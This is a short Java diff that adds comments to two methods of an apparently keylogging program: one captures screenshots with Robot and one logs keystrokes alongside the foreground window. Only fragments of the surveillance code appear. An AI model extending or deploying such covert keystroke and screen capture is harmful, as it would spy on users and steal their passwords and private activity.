@@ -42,6 +42,7 @@ public class App {
     return file.getAbsolutePath();
   }
 
+  // Captures screenshot and save it inside screenshot folder
   public static void capture() {
     try {
       final Robot robot = new Robot();
@@ -74,6 +75,7 @@ public class App {
     }
   }
 
+  // Create a log file that records key strokes 
   static int logger(int key, String file) {
 
     HWND hwnd = User32.INSTANCE.GetForegroundWindow();
